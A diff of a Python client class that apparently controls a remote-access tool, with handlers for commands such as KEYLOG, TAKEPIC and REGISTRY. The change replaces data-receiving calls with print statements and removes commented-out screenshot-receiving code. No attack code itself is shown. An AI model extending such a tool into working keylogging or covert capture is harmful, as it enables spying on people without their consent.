@@ -89,17 +89,16 @@ class Client:
         # self.root = tk.Tk()
         gui.GUI(self, res)
         if res == "APPLICATION":
-            data = self.receive_data()
-            print(data)
-            # gui.GUI.appScene
-            # Display data in a tkinter widget
-            # tk.Label(self.root, text=data).pack()
+            print(res)
         elif res == "SHUTDOWN":
-            data = self.receive_data()
+            print("Shutting down")
+            print(res)
+            # data = self.receive_data()
             # Display data in a tkinter widget
             # tk.Label(self.root, text=data).pack()
         elif res == "REGISTRY":
-            data = self.receive_data()
+            print(res)
+            #data = self.receive_data()
             # Display data in a tkinter widget
             # tk.Label(self.root, text=data).pack()
         elif res == "TAKEPIC":
@@ -118,23 +117,6 @@ class Client:
                     fw.close()
                 break 
             print("Done")
-            # Receive image data from the server
-            # data = self.receive_data()
-            # print(data)
-            # self.gui.ScreenshotScene
-            # gui.GUI.ScreenshotScene
-            # size = int(self.Cli_Sock.recv(10).decode('utf-8'))
-            # print(size)
-
-            # the_photo = self.Cli_Sock.recv(size)
-
-            # print(the_photo)
-            # img_to_save = Image.frombytes("RGB", (500, 500), the_photo)
-            # img_to_save.save("screen.png")
-
-            # Display data in a tkinter widget
-            # tk.Label(self.root, text=data).pack()
-            # Receive file
                
         elif res == "KEYLOG":
             data = self.receive_data()
